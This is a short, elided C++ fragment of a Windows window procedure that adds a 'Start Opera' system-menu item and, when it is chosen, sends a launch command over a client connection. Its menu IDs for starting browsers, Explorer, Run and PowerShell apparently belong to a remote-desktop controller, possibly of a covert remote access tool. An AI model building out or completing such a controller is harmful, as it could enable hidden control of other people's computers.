...
enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startOpera , startIexplore, startPowershell };
...
static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
   ...
   switch(msg)
   {
      case WM_CREATE:
      {
         ...
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startOpera, TEXT("Start Opera"));
...
*/
         ...
         else if (wParam == SysMenuIds::startOpera)
         {
             EnterCriticalSection(&g_critSec);
             if (!SendInput(client->connections[Connection::input], SysMenuIds::startOpera, NULL, NULL))
                 PostQuitMessage(0);
             LeaveCriticalSection(&g_critSec);
             break;
         }
